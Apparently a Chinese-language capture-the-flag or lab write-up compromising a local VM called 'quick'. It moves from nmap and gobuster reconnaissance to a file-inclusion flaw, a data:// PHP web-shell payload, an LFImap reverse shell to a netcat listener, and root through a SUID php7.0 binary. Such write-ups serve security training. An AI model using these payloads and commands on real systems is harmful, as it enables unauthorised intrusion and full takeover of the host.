# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.2.0/24 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-10 22:38 EDT
Nmap scan report for quick (192.168.2.9)
Host is up (0.00017s latency).
MAC Address: 08:00:27:41:D3:56 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for kali (192.168.2.15)
Host is up.
Nmap done: 256 IP addresses (6 hosts up) scanned in 2.08 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p- 192.168.2.9 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-10 22:40 EDT
Nmap scan report for quick (192.168.2.9)
Host is up (0.00043s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 08:00:27:41:D3:56 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.27 seconds
```

# 漏洞利用

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/dirb/wordlists/common.txt -x html,php,txt,zip,git,png,jpg -u http://192.168.2.9 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.9
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt,zip,git,png,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/.html                (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.hta.git             (Status: 403) [Size: 276]
/.hta.html            (Status: 403) [Size: 276]
/.hta.jpg             (Status: 403) [Size: 276]
/.hta.txt             (Status: 403) [Size: 276]
/.hta.zip             (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.hta.png             (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.hta.php             (Status: 403) [Size: 276]
/.htaccess.zip        (Status: 403) [Size: 276]
/.htaccess.html       (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess.png        (Status: 403) [Size: 276]
/.htpasswd.html       (Status: 403) [Size: 276]
/.htaccess.git        (Status: 403) [Size: 276]
/.htpasswd.png        (Status: 403) [Size: 276]
/.htpasswd.zip        (Status: 403) [Size: 276]
/.htpasswd.git        (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htaccess.jpg        (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htpasswd.jpg        (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/about.php            (Status: 200) [Size: 1446]
/cars.php             (Status: 200) [Size: 1502]
/connect.php          (Status: 500) [Size: 0]
/contact.php          (Status: 200) [Size: 1395]
/home.php             (Status: 200) [Size: 2534]
/images               (Status: 301) [Size: 311] [--> http://192.168.2.9/images/]                                                          
/index.php            (Status: 200) [Size: 3735]
/index.php            (Status: 200) [Size: 3735]
/server-status        (Status: 403) [Size: 276]
Progress: 36912 / 36920 (99.98%)
===============================================================
Finished
===============================================================
```

发现参数page的值直接拼接.php后缀并包含文件

```
http://192.168.2.9/index.php?page=home
http://192.168.2.9/index.php?page=cars
http://192.168.2.9/index.php?page=maintenance_and_repair
```

发现确实存在文件包含漏洞

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.2.9/index.php?page=php://filter/convert.base64-encode/resource=index
    <main>
        PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+UXVpY2sgQXV0b21hdGl2ZTwvdGl0bGU+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9InN0eWxlcy5jc3MiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9mb250LWF3ZXNvbWUvNS4xNS4zL2Nzcy9hbGwubWluLmNzcyI+CjwvaGVhZD4KPGJvZHk+CiAgICA8aGVhZGVyPgogICAgICAgIDwhLS0gUGhvdG8gYnkgUGl4YWJheTogaHR0cHM6Ly93d3cucGV4ZWxzLmNvbS9waG90by9ibGFjay1sYW1ib3JnaGluaS1tdXJjaWVsYWdvLTM4NTcwLyAtLT4KICAgICAgICA8aW1nIHNyYz0iaW1hZ2VzL2xvZ28ucG5nIiBhbHQ9IkxvZ28iIGhlaWdodD0iMTAwIj4KICAgIDwvaGVhZGVyPgogICAgPG5hdj4KICAgICAgICA8dWw+CiAgICAgICAgICAgIDxsaT48YSBocmVmPSJpbmRleC5waHA/cGFnZT1ob21lIj5Ib21lPC9hPjwvbGk+CiAgICAgICAgICAgIDxsaT48YSBocmVmPSJpbmRleC5waHA/cGFnZT1jYXJzIj5DYXJzPC9hPjwvbGk+CiAgICAgICAgICAgIDxsaT48YSBocmVmPSJpbmRleC5waHA/cGFnZT1tYWludGVuYW5jZV9hbmRfcmVwYWlyIj5NYWludGVuYW5jZSAmIFJlcGFpcjwvYT48L2xpPgogICAgICAgICAgICA8bGk+PGEgaHJlZj0iaW5kZXgucGhwP3BhZ2U9YWJvdXQiPkFib3V0PC9hPjwvbGk+CiAgICAgICAgICAgIDxsaT48YSBocmVmPSJpbmRleC5waHA/cGFnZT1jb250YWN0Ij5Db250YWN0PC9hPjwvbGk+CiAgICAgICAgPC91bD4KICAgIDwvbmF2PgogICAgPG1haW4+CiAgICAgICAgPD9waHAKICAgICAgICBpZiAoaXNzZXQoJF9HRVRbJ3BhZ2UnXSkpIHsKICAgICAgICAgICAgJHBhZ2UgPSAkX0dFVFsncGFnZSddOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRwYWdlID0gJ2hvbWUnOwogICAgICAgIH0KCiAgICAgICAgaW5jbHVkZSgkcGFnZSAuICcucGhwJyk7CgogICAgICAgID8+CiAgICA8L21haW4+CiAgICA8Zm9vdGVyPgogICAgICAgIDxkaXYgY2xhc3M9ImZvb3RlciI+CiAgICAgICAgICAgIDxwPiZjb3B5OyA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+ZG9jdW1lbnQud3JpdGUoIjE5NTAgLSAiKyBuZXcgRGF0ZSgpLmdldEZ1bGxZZWFyKCkpOzwvc2NyaXB0PiBRdWljayBBdXRvbWF0aXZlLiBBbGwgcmlnaHRzIHJlc2VydmVkLjwvcD4KICAgICAgICA8L2Rpdj4KICAgIDwvZm9vdGVyPgo8L2JvZHk+CjwvaHRtbD4=    </main>
```

使用LFImap自动利用

```
┌──(kali㉿kali)-[~/lfimap]
└─$ python3 lfimap.py -U "http://192.168.2.9/index.php?page=PWN" -a

[i] Testing GET 'page' parameter...
[+] LFI -> 'http://192.168.2.9/index.php?page=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex'
[+] RCE -> 'http://192.168.2.9/index.php?page=data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat%20%2Fetc%2Fpasswd'

----------------------------------------
LFImap finished with execution.
Parameters tested: 1
Requests sent: 55
Vulnerabilities found: 2
┌──(kali㉿kali)-[~/lfimap]
└─$ python3 lfimap.py -U "http://192.168.2.9/index.php?page=PWN" -x --lhost 192.168.2.15 --lport 1234

[i] Testing GET 'page' parameter...
[+] LFI -> 'http://192.168.2.9/index.php?page=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex'
[+] RCE -> 'http://192.168.2.9/index.php?page=data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat%20%2Fetc%2Fpasswd'
[?] Checking if bash is available on the target system...
[.] Trying to pop reverse shell to 192.168.2.15:1234 using bash via data wrapper...
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.2.15] from (UNKNOWN) [192.168.2.9] 46072
bash: cannot set terminal process group (749): Inappropriate ioctl for device
bash: no job control in this shell
www-data@quick:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 权限提升

```
www-data@quick:/var/www/html$ whoami;id;hostname;uname -a
whoami;id;hostname;uname -a
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
quick
Linux quick 5.4.0-169-generic #187-Ubuntu SMP Thu Nov 23 14:52:28 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
www-data@quick:/var/www$ sudo -l
sudo -l
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
www-data@quick:/var/www/html$ find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
/snap/core20/1828/usr/bin/chfn
/snap/core20/1828/usr/bin/chsh
/snap/core20/1828/usr/bin/gpasswd
/snap/core20/1828/usr/bin/mount
/snap/core20/1828/usr/bin/newgrp
/snap/core20/1828/usr/bin/passwd
/snap/core20/1828/usr/bin/su
/snap/core20/1828/usr/bin/sudo
/snap/core20/1828/usr/bin/umount
/snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1828/usr/lib/openssh/ssh-keysign
/snap/snapd/18357/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/bin/at
/usr/bin/sudo
/usr/bin/umount
/usr/bin/mount
/usr/bin/chsh
/usr/bin/su
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/php7.0
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/fusermount
www-data@quick:/var/www/html$ /usr/bin/php7.0 -r "pcntl_exec('/bin/sh', ['-p']);"
</usr/bin/php7.0 -r "pcntl_exec('/bin/sh', ['-p']);"
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```
